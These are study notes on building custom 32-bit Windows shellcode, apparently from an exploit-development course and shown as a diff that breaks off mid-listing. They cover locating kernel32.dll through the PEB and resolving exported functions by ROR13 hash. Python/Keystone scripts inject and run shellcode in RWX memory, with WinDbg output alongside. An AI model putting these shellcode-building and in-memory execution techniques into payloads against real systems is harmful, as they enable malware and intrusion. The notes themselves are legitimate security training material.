@@ -4329,6 +4329,2195 @@ Our egghunter maintains functionality on older Windows versions such as 7 or 8.
 
 # Creating Custom Shellcode
 
+## Calling Conventions on x86
+
+`Win32 API` functions use the `__stdcall` calling convention, while C runtime functions use the `__cdecl` calling convention.
+
+In both of these cases, the **parameters** are pushed to the **stack** by the caller in **reverse** order.
+
+However, when using `__stdcall`, the stack is cleaned up by the **callee**, while it is cleaned up by the **caller** when `__cdecl` is used.
+
+For any calling convention on a 32-bit system:
+- The `EAX, EDX, and ECX` registers are considered volatile, i.e. they can be **clobbered** during a function call.
+- All other registers are considered non-volatile and must be preserved by the callee.
+
+**clobbered**: the process of overwriting the value of a CPU register as part of a function call and not restoring it back to the original value before returning out of the call.
+
+## The System Call Problem
+
+The **Windows Native API** is a mostly-undocumented API exposed to user-mode applications by the `ntdll.dll` library. A way for user-mode applications to call OS functions located in the kernel in a controlled manner.
+
+Kernel-level functions are typically identified by **system call numbers**.
+
+On Windows, these system call numbers tend to **change** between major and minor version releases.
+
+The feature set exported by the Windows system call interface is rather **limited**.
+
+E.g., Windows does not export a socket API via the system call interface. 
+
+=> Avoid direct system calls to write universal and reliable shellcode for Windows.
+
+Without system calls, our only option for communicating directly with the kernel is to use the **Windows API**, which is exported by `DLLs` that are mapped into process memory space at runtime.
+
+If DLLs are not already loaded into the process space, **load** them and **locate** the functions they export > invoke them as part of our shellcode to perform specific tasks.
+
+`kernel32.dll`:
+
+- The `LoadLibraryA` function implements the mechanism to load DLLs.
+
+- `GetModuleHandleA` can be used to get the base address of an already-loaded DLL.
+
+- `GetProcAddress` can be used to resolve symbols.
+
+**Avoid** the use of **hard-coded function addresses** to ensure our shellcode is **portable** across different Windows versions.
+
+The memory addresses of `LoadLibrary` and `GetProcAddress` are not automatically known to us when we want to execute our shellcode in memory.
+
+1. Obtain the **base address** of `kernel32.dll`.
+
+2. Resolve various function addresses from `kernel32.dll` and any other required `DLLs`.
+
+3. Invoke our resolved functions to achieve various results.
+
+## Finding kernel32.dll
+
+Ensure that the DLL is mapped within the same memory space as our running shellcode.
+
+`kernel32.dll` is almost guaranteed to be loaded because it exports core APIs required for most processes.
+
+Once we obtain the **base address** of `kernel32.dll` and can resolve its exported functions, we'll:
+
+- Load additional DLLs using `LoadLibraryA`
+
+- Leverage `GetProcAddress` to resolve functions within them.
+
+The most commonly-used method relies on the Process Environmental Block (`PEB`) structure.
+
+2 other techniques, the Structured Exception Handler (SEH)1 and the "Top Stack" method, are less portable and will not work on modern versions of Windows.
+
+### PEB Method
+
+The `PEB` structure is allocated by the OS for every running **process**.
+
+On 32-bit versions of Windows, the `FS` register always contains a pointer to the current Thread Environment Block (`TEB`).
+
+The `TEB` is a data structure that stores information about the currently-running **thread**.
+
+Dump the TEB structure.
+
+`dt nt!_TEB @$teb`
+
+```
+ntdll!_TEB
+   +0x000 NtTib            : _NT_TIB
+   ...
+   +0x030 ProcessEnvironmentBlock : 0x7f60b000 _PEB
+...
+```
+
+At offset `0x30`, a pointer to the `PEB` structure.
+
+Information from the `PEB`, including the **image name, process startup arguments, process heaps**, and more.
+
+Gather a pointer to the `_PEB_LDR_DATA` structure through the `PEB`:
+
+`dt nt!_PEB 0x7f60b000`
+
+```
+ntdll!_PEB
+...
+   +0x008 ImageBaseAddress : 0x00230000 Void
+   +0x00c Ldr              : 0x776c9aa0 _PEB_LDR_DATA
+...
+```
+
+The `_PEB_LDR_DATA` structure, located at offset `0x0C` inside the `PEB`.
+
+This pointer references 3 linked lists revealing the **loaded modules** that have been mapped into the process memory space.
+
+Gather the `InInitializationOrderModuleList` list through the `_PEB_LDR_DATA` structure:
+
+`dt _PEB_LDR_DATA 0x776c9aa0`
+
+```
+ntdll!_PEB_LDR_DATA
+   +0x000 Length           : 0x30
+   +0x004 Initialized      : 0x1 ''
+   +0x008 SsHandle         : (null) 
+   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4011728 - 0x40180d0 ]
+   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4011730 - 0x40180d8 ]
+   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4011658 - 0x40180e0 ]
+...
+```
+
+3 linked lists:
+
+- `InLoadOrderModuleList` shows the previous and next module in load order.
+-	`InMemoryOrderModuleList` shows the previous and next module in memory placement order.
+-	`InInitializationOrderModuleList` shows the previous and next module in initialization order.
+
+WinDbg describes `InInitializationOrderModuleList` as a `LIST_ENTRY` structure composed of 2 fields:
+
+Dump the `_LIST_ENTRY` structure:
+
+`dt _LIST_ENTRY (0x776c9aa0 + 0x1c)`
+
+```
+ntdll!_LIST_ENTRY
+ [ 0x4011658 - 0x40180e0 ]
+   +0x000 Flink            : 0x04011658 _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ]
+   +0x004 Blink            : 0x040180e0 _LIST_ENTRY [ 0x776c9abc - 0x40188c0 ]
+```
+
+The `Flink` and `Blink` fields are commonly used in doubly-linked lists to access the next (Flink) or previous (Blink) entry in the list.
+
+The `_LIST_ENTRY` structure indicated in the `_PEB_LDR_DATA` is embedded as part of a larger structure of type `_LDR_DATA_TABLE_ENTRY_`.
+
+Dump the `LDR_DATA_TABLE_ENTRY` structure (Subtract the value `0x10` from the address of the `_LIST_ENTRY` structure to reach the beginning of the `_LDR_DATA_TABLE_ENTRY_` structure.)
+
+`dt _LDR_DATA_TABLE_ENTRY (0x04011658 - 0x10)`
+
+```
+ntdll!_LDR_DATA_TABLE_ENTRY
+   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4011ab0 - 0x4011728 ]
+   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4011ab8 - 0x4011730 ]
+   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ]
+   +0x018 DllBase          : 0x775c0000 Void
+   +0x01c EntryPoint       : (null) 
+   +0x020 SizeOfImage      : 0x17a000
+   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\SYSTEM32\ntdll.dll"
+   +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll"
+   +0x034 FlagGroup        : [4]  "???"
+   +0x034 Flags            : 0xa2c4
+...
+```
+
+- `DllBase` field holds the DLL's base address.
+
+- `BaseDllName` field, a nested structure of `_UNICODE_STRING` type, holds he name of the DLL
+
+The `_UNICODE_STRING` structure has a `Buffer` member starting at offset `0x04` from the beginning of this structure, which contains a pointer to a string of characters.
+
+=> The DLL name starts at offset `0x30` (=`0x2c + 0x04`) from the beginning of the `_LDR_DATA_TABLE_ENTRY_` structure.
+
+### Assembling the Shellcode
+
+- Use the Keystone Framework to assemble our shellcode on the fly.
+
+- Use the `CTypes` Python library to run this code directly in the memory space of the `python.exe` process using a number of Windows APIs.
+
+Our Python script will:
+
+-	Transform our ASM code into opcodes using the Keystone framework.
+- Allocate a chunk of memory for our shellcode.
+-	Copy our shellcode to the allocated memory.
+-	Execute the shellcode from the allocated memory.
+
+Uses the `PEB` technique to retrieve the base address of `kernel32.dll`.
+
+`find_kernel32.py`
+
+```python
+import ctypes, struct
+from keystone import *
+
+CODE = (
+    " start:                             "  #
+    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov   ebp, esp                  ;"  #
+    "   sub   esp, 60h                  ;"  #
+
+    " find_kernel32:                     "  #
+    "   xor   ecx, ecx                  ;"  #   ECX = 0
+    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
+    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr
+    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder
+    
+    " next_module:                      "  #
+    "   mov   ebx, [esi+8h]             ;"  #   EBX = InInitOrder[X].base_address
+    "   mov   edi, [esi+20h]            ;"  #   EDI = InInitOrder[X].module_name
+    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
+    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
+    "   jne   next_module               ;"  #   No: try next module.
+    "   ret                             ;"  #
+)
+
+# Initialize engine in X86-32bit mode
+ks = Ks(KS_ARCH_X86, KS_MODE_32)
+encoding, count = ks.asm(CODE)
+print("Encoded %d instructions..." % count)
+
+sh = b""
+for e in encoding:
+    sh += struct.pack("B", e)
+shellcode = bytearray(sh)
+
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                     buf,
+                                     ctypes.c_int(len(shellcode)))
+
+print("Shellcode located at address %s" % hex(ptr))
+input("...ENTER TO EXECUTE SHELLCODE...")
+
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(ptr),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.pointer(ctypes.c_int(0)))
+
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+```
+
+The `.asm` method will produce the opcodes for our shellcode.
+
+Using CTypes to call Windows APIs from Python
+
+Once the opcodes of our shellcode are stored as a byte array, call `VirtualAlloc`to allocate a memory page with `PAGE_EXECUTE_READWRITE` protections.
+
+- Call `RtlMoveMemory` to copy the shellcode opcodes to the newly-allocated memory page.
+
+- Call `CreateThread` to run the shellcode in a new thread.
+
+`start` function:
+
+- Leverage `int3` instruction as a software breakpoint to break right before our shellcode, saving us time from printing out the allocated memory address and manually setting the breakpoint in our debugger each time we run our script.
+
+- `mov ebp, esp; sub esp, 60h`: emulates an actual function call in which the ESP register is moved to EBP so that arguments passed to the function can be easily accessed. Subtract an arbitrary offset so that the stack does not get clobbered.
+
+`find_kernel32` function:
+
+- The `mov esi, fs:[ecx+0x30]` instruction stores the pointer to the `PEB` in the ESI register.
+
+- Dereference ESI at offset `0x0C` to get a pointer to the `_PEB_LDR_DATA` structure and store it in ESI once again.
+
+- Dereference ESI at offset `0x1C`, to get the `InInitializationOrderModuleList` entry.
+
+The `next_module` function:
+
+- Move the **base address** of a loaded module to the `EBX` register and the **module name** to `EDI`.
+
+- Sets `ESI` to the **next** `InInitializationOrderModuleList` entry using the `Flink` member.
+
+- Compare the WORD pointed to by `edi + 12 * 2` to `NULL` (`ecx`).
+
+The length of the `kernel32.dll` string is `12` bytes. Because the string is stored in `UNICODE` format, every character of the string will be represented as a `WORD`, making the length `24` in Unicode.
+
+=> If the WORD starting at the `25th` byte is `NULL`, we have found a string of `12 UNICODE` characters.
+
+If the comparison fails, take a conditional jump back to `next_module` and proceed to check the next entry until the comparison succeeds.
+
+Because `InInitializationOrderModuleList` displays modules based on the order they were initialized, the 1st module name that matches the comparison will always be `kernel32.dll`, as it is one of the first to be initialized.
+
+Until the release of Windows 7, the `kernel32.dll` initialization order was always constant for all Microsoft OSs.
+
+This method became ineffective in Windows 7 and a more universal method was introduced that works on later versions of Windows as well.
+
+```bat
+python find_kernel32.py
+```
+
+Attach WinDbg to the `python.exe` process
+
+`u @eip Ld`
+
+```
+011e0000 cc              int     3
+011e0001 89e5            mov     ebp,esp
+011e0003 83ec60          sub     esp,60h
+011e0006 31c9            xor     ecx,ecx
+011e0008 648b7130        mov     esi,dword ptr fs:[ecx+30h]
+011e000c 8b760c          mov     esi,dword ptr [esi+0Ch]
+011e000f 8b761c          mov     esi,dword ptr [esi+1Ch]
+011e0012 8b5e08          mov     ebx,dword ptr [esi+8]
+011e0015 8b7e20          mov     edi,dword ptr [esi+20h]
+011e0018 8b36            mov     esi,dword ptr [esi]
+011e001a 66394f18        cmp     word ptr [edi+18h],cx
+011e001e 75f2            jne     011e0012
+011e0020 c3              ret
+```
+
+Set a breakpoint at the compare instruction 
+
+`bp 011e001a`
+
+`g`
+
+`r @ebx`
+
+```
+ebx=77020000
+```
+
+`du @edi`
+
+```
+77026c08  "ntdll.dll"
+```
+
+`lm m ntdll`
+
+```
+Browse full module list
+start    end        module name
+77020000 7719a000   ntdll      (pdb symbols)          c:\symbols\ntdll.pdb\FA32EA7CECAA40BA94BF296AC6F178701\ntdll.pdb
+```
+
+=> The `ntdll.dll` module as the 1st entry + The base address gathered from the `_LDR_DATA_TABLE_ENTRY_` structure is correct.
+
+The **conditional jump** will be taken, causing us to loop over the entries until we find the entry for the `kernel32.dll` module.
+
+Allow the execution to continue until the next `return` instruction - the last instruction in our shellcode that will be executed if the conditional jump is not taken.
+
+`pt`
+
+```
+011e0020 c3              ret
+```
+
+`r @ebx`
+
+```
+ebx=76e40000
+```
+
+`du @edi`
+
+```
+00f11c90  "KERNEL32.DLL"
+```
+
+`lm m kernel32`
+
+```
+Browse full module list
+start    end        module name
+76e40000 76ed5000   KERNEL32   (pdb symbols)          c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb
+```
+
+## Resolving Symbols
+
+Our shellcode will crash if we continue to execute assembly instructions after the return.
+
+To cleanly exit our shellcode, dynamically resolve the address of `TerminateProcess` API using the `Export Directory Table`.
+
+`kernel32.dll` exports APIs such as `GetProcAddress`, which will allow us to locate various exported functions. The issue is that `GetProcAddress` also needs to be located before it can be used.
+
+=> Traverse the `Export Address Table` (EAT) of a DLL loaded in memory.
+
+To gather a **module's EAT address**, first acquire the **base address** of the selected DLL.
+
+### Export Directory Table
+
+The most reliable way to **resolve symbols** from DLLs is by using the **Export Directory Table** method.
+
+**Symbols** refers to the **function names** and their **starting memory addresses**.
+
+DLLs that export functions have an export directory table that contains important information about symbols:
+
+-	Number of exported symbols.
+-	Relative Virtual Address (`RVA`) of the export-functions array.
+-	`RVA` of the export-names array.
+-	`RVA` of the export-ordinals array.
+
+The Export Directory Table `_IMAGE_EXPORT_DIRECTORY` structure contains additional fields:
+
+```C
+typedef struct _IMAGE_EXPORT_DIRECTORY {
+  DWORD Characteristics;
+  DWORD TimeDateStamp;
+  WORD MajorVersion;
+  WORD MinorVersion;
+  DWORD Name;
+  DWORD Base;
+  DWORD NumberOfFunctions;
+  DWORD NumberOfNames;
+  DWORD AddressOfFunctions;
+  DWORD AddressOfNames;
+  DWORD AddressOfNameOrdinals;
+}
+```
+
+To resolve a symbol by name, begin with the `AddressOfNames` array.
+
+Every name will have a unique entry and **index** in the array.
+
+- Once found the name of the symbol at index `i` in the `AddressOfNames` array, use the same index `i` in the `AddressOfNameOrdinals` array.
+
+- The entry from the `AddressOfNameOrdinals` array at index `i` will contain a new index that we will use in the `AddressOfFunctions` array.
+
+- At this new index, find the **relative** VMA of the function.
+
+- Translate this address into a VMA by adding the **base address** of the DLL to it.
+
+Since the size of our shellcode is important, optimize the search algorithm for our required symbol names.
+
+=> Use a **hashing function** that transforms a string into a 4 byte hash.
+
+Once the `LoadLibraryA` symbol has been resolved, we can load arbitrary modules and locate the functions needed to build our custom shellcode without using `GetProcAddress`.
+
+### Working with the Export Names Array
+
+The `Export Directory Table` structure fields contain **relative** addresses.
+
+To obtain the `VMA`, add the `kernel32.dll` base address to the RVA, which is currently stored in the `EBX` register.
+
+`resolving_symbols_0x01.py`: Finding the Export Directory Table and AddressOfNames VMAs
+
+```python
+...
+CODE = (
+    " start:                             "  #
+    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov   ebp, esp                  ;"  #
+    "   sub   esp, 0x200                ;"  #
+    "   call  find_kernel32             ;"  #
+    "   call  find_function             ;"  #
+
+    " find_kernel32:                     "  #
+    "   xor   ecx, ecx                  ;"  #   ECX = 0
+    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
+    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
+    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder
+
+    " next_module:                       "  #
+    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
+    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
+    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
+    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
+    "   jne   next_module               ;"  #   No: try next module.
+    "   ret                             ;"  #
+
+    " find_function:                     "  #
+    "   pushad                          ;"  #   Save all registers
+                                            #   Base address of kernel32 is in EBX from 
+                                            #   Previous step (find_kernel32)
+    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
+    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
+    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
+    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
+    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
+    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
+    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later
+
+    " find_function_loop:                "  #
+    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
+    "   dec   ecx                       ;"  #   Decrement our names counter
+    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
+    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
+    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
+
+    " find_function_finished:            "  #
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"  #
+)
+...
+```
+
+The instructions required to find the base address of `kernel32.dll` have been encapsulated into the `find_kernel32` function.
+
+`find_function` function:
+
+- Saves all the register values on the stack using `PUSHAD` => to restore these values cleanly later on, even if our ASM code clobbers the register values during its execution.
+
+- Store the value pointed to by the `EBX` register (which holds the base address of `kernel32.dll`) at offset `0x3C` in `EAX`. At this offset from the beginning of a PE (`MS-DOS header`) is the offset to the `PE header`.
+
+- Add the value stored in `EAX` to the base address of `kernel32.dll` along with a static offset of `0x78`, and stores the dereferenced value in `EDI`. The `0x78` offset from the `PE header` is the location of the `RVA` of the `Export Directory Table`.
+
+- This address is then converted into a `VMA` by adding it to the **base address** of `kernel32.dll`. `EDI` now contains the `VMA` of our `Export Directory Table`.
+
+- Store the value pointed to by `EDI` and a static offset of `0x18` into `ECX`. This is the offset to the `NumberOfNames` field which contains the number of exported symbols. => use `ECX` as a counter to parse the `AddressOfNames` array.
+
+- Move the value pointed to by `EDI` and the static offset of `0x20`, which corresponds to the `AddressOfNames` field, into `EAX`. Since this is a `RVA`, add the **base address** of `kernel32.dll` to it in order to obtain the `VMA` of the `AddressOfNames` array.
+
+- Stores the `AddressOfNames VMA` at an arbitrary offset from `EBP`. Currently, EBP contains a pointer to the stack, thanks to the `mov ebp, esp` instruction.
+
+`find_function_loop` function:
+
+- `jecxz find_function_finished` jump will be taken if `ECX`, which holds the number of exported symbols, is `NULL`, i.e. reached the end of the array without finding our symbol name.
+
+- If the `ECX` register is not `NULL`, decrement our counter (`ECX`) and retrieve the previously-saved `AddressOfNames VMA`.
+
+- Save the `RVA` of the symbol name in `ESI`. Because each entry in the array is a DWORD, use the counter `ECX` as an index to the `AddressOfNames` array and multiply it by `4`.
+
+- Obtain the `VMA` of the symbol name by adding the **base address** of `kernel32.dll` to the `ESI` register.
+
+Dumping the `IMAGE_DOS_HEADER` structure to obtain the offset to the `PE header`
+
+`lm m kernel32`
+
+```
+Browse full module list
+start    end        module name
+76e40000 76ed5000   KERNEL32   (pdb symbols)          c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb
+```
+
+`dt ntdll!_IMAGE_DOS_HEADER 0x76e40000`
+
+```
+   +0x000 e_magic          : 0x5a4d
+   +0x002 e_cblp           : 0x90
+...
+   +0x03c e_lfanew         : 0n248
+```
+
+`? 0n248`
+
+```
+Evaluate expression: 248 = 000000f8
+```
+
+The PE header can be found at offset `0xF8`. Reviewing the PE header structure (`_IMAGE_NT_HEADERS`), we'll notice the `IMAGE_OPTIONAL_HEADER` structure at offset `0x18`:
+
+`dt ntdll!_IMAGE_NT_HEADERS 0x76e40000 + 0xf8`
+
+```
+   +0x000 Signature        : 0x4550
+   +0x004 FileHeader       : _IMAGE_FILE_HEADER
+   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
+```
+
+The `_IMAGE_OPTIONAL_HEADER` structure contains another structure named `_IMAGE_DATA_DIRECTORY` at offset `0x60`:
+
+`dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76e40000 + 0xf8 + 0x18`
+
+```
+   +0x000 Magic            : 0x10b
+   +0x002 MajorLinkerVersion : 0xc ''
+   +0x003 MinorLinkerVersion : 0xa ''
+...
+   +0x05c NumberOfRvaAndSizes : 0x10
+   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
+```
+
+The `DataDirectory` is an array of length `16`. Each entry in this array is an `_IMAGE_DATA_DIRECTORY` structure.
+
+Examine the `_IMAGE_DATA_DIRECTORY` structure prototype which is comprised of 2 DWORD fields, (= `0x08` size):
+
+```C
+typedef struct _IMAGE_DATA_DIRECTORY {
+  DWORD VirtualAddress;
+  DWORD Size;
+} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
+```
+
+The `DataDirectory` array holds information about the `Export Directory Table`.
+
+Even though the structure field is named VirtualAddress, this field contains the **relative** virtual address.
+
+`dt ntdll!_IMAGE_DATA_DIRECTORY 0x76e40000 + 0xf8 + 0x78`
+
+```
+   +0x000 VirtualAddress   : 0x75940
+   +0x004 Size             : 0xd1c0
+```
+
+Dump all the file header information.
+
+`!dh -f kernel32`
+
+```
+...
+OPTIONAL HEADER VALUES
+     10B magic #
+   12.10 linker version
+   82000 size of code
+   12000 size of initialized data
+       0 size of uninitialized data
+   1DF30 address of entry point
+    1000 base of code
+...
+    4140  DLL characteristics
+            Dynamic base
+            NX compatible
+            Guard
+   75940 [    D1C0] address [size] of Export Directory
+   85354 [     4EC] address [size] of Import Directory
+...
+```
+
+### Computing Function Name Hashes
+
+After obtaining the address to the `ArrayOfNames` array, parse it for the symbol we are interested in, namely `TerminateProcess`.
+
+Use a hashing algorithm to search for this symbol in the array.
+
+`resolving_symbols_0x02.py`: Hash Routines to Compute Function Names
+
+```python
+    CODE = (
+    ...
+    " compute_hash:                      "  #
+    "   xor   eax, eax                  ;"  #   Zero eax
+    "   cdq                             ;"  #   Zero edx
+    "   cld                             ;"  #   Clear direction
+
+    " compute_hash_again:                "  #
+    "   lodsb                           ;"  #   Load the next byte from esi into al
+    "   test  al, al                    ;"  #   Check for NULL terminator
+    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
+    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
+    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
+    "   jmp   compute_hash_again        ;"  #   Next iteration
+
+    " compute_hash_finished:             "  #
+
+    " find_function_finished:            "  #
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"  #
+)
+```
+
+The final instruction fetches the 1st entry in `ArrayOfNames` and converts to a `VMA` with the `ESI` register pointing to the symbol name.
+
+The `compute_hash` function:
+
+- `XOR` operation sets the `EAX` register to `NULL`.
+
+- The `CDQ` instruction uses the `NULL` value in `EAX` to set `EDX` to `NULL` as well.
+
+- `CLD` clears the direction flag (`DF`) in the `EFLAGS` register and cause all string operations to increment the index registers, which are `ESI` (where our symbol name is stored) and/or `EDI`.
+
+The `compute_hash_again` function:
+
+- `LODSB` instruction will load a byte from the memory pointed to by `ESI` into the `AL` register and then automatically increment or decrement the register according to the `DF` flag.
+
+- `TEST` instruction using the `AL` register as both operands.
+
+    - If `AL` is `NULL`, take the `JZ` conditional jump to the `compute_hash_finished`.
+
+    - If `AL` is not `NULL`, arrive at a `ROR` bit-wise operation. `EDX` is rotated right by `0x0D` bits.
+
+Use `a @eip` register to place the `ROR` instruction right at the memory address where `EIP` is pointing to.
+
+Next, type the assembly instruction `ror eax, 0x01`, and after pressing `Return` (`Enter`) twice, the instruction will be placed in memory.
+
+`r @eax=0x41`
+
+`a @eip`
+
+`ror eax, 0x01`
+
+`.formats @eax`
+
+```
+Evaluate expression:
+  ...
+  Binary:  00000000 00000000 00000000 01000001
+  ...
+```
+
+`t`
+
+`.formats @eax`
+
+```
+Evaluate expression:
+  ...
+  Binary:  10000000 00000000 00000000 00100000
+  ...
+```
+
+After the rotate bits right instruction, `add edx, eax`, and jump to the beginning of `compute_hash_again`. (`eax` holds a byte of our symbol name)
+
+This function represents a loop that will go over each byte of a symbol name and add it to an accumulator (`EDX`) right after the rotate bits right operation.
+
+Once we reach the end of our symbol name, the `EDX` register will contain a unique 4-byte hash for that symbol name.
+
+=> Compare it to a pre-generated hash to determine if we have found the correct entry.
+
+Python script to compute a 4-byte hash from a **function name** that our shellcode will search for:
+
+#### ComputeHash.py
+
+```bat
+python ComputeHash.py timeGetTime
+```
+
+```python
+#!/usr/bin/python
+import numpy, sys
+
+def ror_str(byte, count):
+    binb = numpy.base_repr(byte, 2).zfill(32)
+    while count > 0:
+        binb = binb[-1] + binb[0:-1]
+        count -= 1
+    return (int(binb, 2))
+
+if __name__ == '__main__':
+    try:
+        esi = sys.argv[1]
+    except IndexError:
+        print("Usage: %s INPUTSTRING" % sys.argv[0])
+        sys.exit()
+
+    # Initialize variables
+    edx = 0x00
+    ror_count = 0
+
+    for eax in esi:
+        edx = edx + ord(eax)
+        if ror_count < len(esi)-1:
+            edx = ror_str(edx, 0xd)
+        ror_count += 1
+
+    print(hex(edx))
+```
+
+The `timeGetTime` string was the last symbol name exported by `kernel32.dll`.
+
+```bat
+python ComputeHash.py timeGetTime
+```
+
+`u @eip L18`
+
+```
+02a3002e 60              pushad
+...
+02a30043 e319            jecxz   02a3005e
+02a30045 49              dec     ecx
+02a30046 8b45fc          mov     eax,dword ptr [ebp-4]
+02a30049 8b3488          mov     esi,dword ptr [eax+ecx*4]
+02a3004c 01de            add     esi,ebx
+02a3004e 31c0            xor     eax,eax
+02a30050 99              cdq
+02a30051 fc              cld
+02a30052 ac              lods    byte ptr [esi]
+02a30053 84c0            test    al,al
+02a30055 7407            je      02a3005e
+02a30057 c1ca0d          ror     edx,0Dh
+02a3005a 01c2            add     edx,eax
+02a3005c ebf4            jmp     02a30052
+02a3005e 61              popad
+02a3005f c3              ret
+```
+
+Set up 2 software breakpoints.
+
+1. After obtaining the `RVA` to the first entry in the `AddressOfNames` array (`add esi,ebx`), allowing us to confirm the symbol name that will be hashed.
+
+2. After our `compute_hash_again` function has finished executing, allowing us to view the resultant hash in `EDX`. (`add edx,eax`)
+
+`bp 02a3004e` 
+
+`bp 02a3005e`
+
+`g`
+
+```
+02a3004e 31c0            xor     eax,eax
+```
+
+`da @esi`
+
+```
+76ec2af4  "timeGetTime"
+```
+
+`g`
+
+```
+02a3005e 61              popad
+```
+
+`r edx`
+
+```
+edx=998eaf95
+```
+
+The generated hash matches the one we obtained using our Python script.
+
+Note: The `ROR` function in the script rotates bits using a string representation of a binary number due to the fact that it is simpler to visualize for the student.
+
+A correct implementation would use shift and or bitwise operators combined together (`h<<5 | h>>27`). 
+
+### Fetching the VMA of a Function
+
+Search for the `TerminateProcess` symbol and obtain its `RVA` and `VMA` inside our shellcode.
+
+The computed hash is stored in the `EDX` register.
+
+=> Compare the hash from `EDX` with the one generated by our Python script `0x78b5b983`.
+
+```bat
+python ComputeHash.py TerminateProcess
+```
+
+If the hashes match, re-use the same index from `ECX` in the `AddressOfNameOrdinals` array and gather the new index. => obtain the `RVA` and, finally, `VMA` of the function.
+
+`resolving_symbols_0x03.py`: Comparing the generated hash with the static one and fetching the function VMA
+
+```python
+...
+CODE = (
+    " start:                             "  #
+    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov   ebp, esp                  ;"  #
+    "   sub   esp, 0x200                ;"  #
+    "   call  find_kernel32             ;"  #
+    "   push  0x78b5b983                ;"  #   TerminateProcess hash
+    "   call  find_function             ;"  #
+    "   xor   ecx, ecx                  ;"  #   NULL ECX
+    "   push  ecx                       ;"  #   uExitCode
+    "   push  0xffffffff                ;"  #   hProcess
+    "   call  eax                       ;"  #   Call TerminateProcess
+
+    " find_kernel32:                     "  #
+    "   xor   ecx, ecx                  ;"  #   ECX = 0
+    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
+    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
+    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder
+
+    " next_module:                       "  #
+    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
+    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
+    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
+    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
+    "   jne   next_module               ;"  #   No: try next module.
+    "   ret                             ;"  #
+
+    " find_function:                     "  #
+    "   pushad                          ;"  #   Save all registers
+                                            #   Base address of kernel32 is in EBX from 
+                                            #   Previous step (find_kernel32)
+    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
+    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
+    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
+    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
+    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
